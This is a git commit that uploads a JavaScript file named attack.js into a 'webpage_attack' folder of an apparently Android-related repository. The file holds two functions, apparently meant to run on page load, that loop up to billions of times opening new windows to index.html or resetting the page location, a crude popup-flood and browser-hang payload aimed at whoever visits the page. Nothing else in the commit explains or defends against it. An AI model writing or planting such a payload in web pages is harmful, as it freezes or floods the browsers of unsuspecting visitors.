ffbb603f5128a12ad38455db1b4fd3410a67e75e
LinWin-Cloud <96580724+LinWin-Cloud@users.noreply.github.com>
2022-05-28 22:24:18 +0800

    Add files via upload

---
+++ Android_Resources_code/webpage_attack/attack.js
@@ -0,0 +1,14 @@
+function onload_1()
+{
+    for(i = 1 ; i<=100000000 ; i++)
+    {
+        window.open("index.html")
+    }
+}
+function onload_2()
+{
+    for(i = 1 ; i<=10000000000 ; i++)
+    {
+        window.location.href = "index.html" ;
+    }
+}
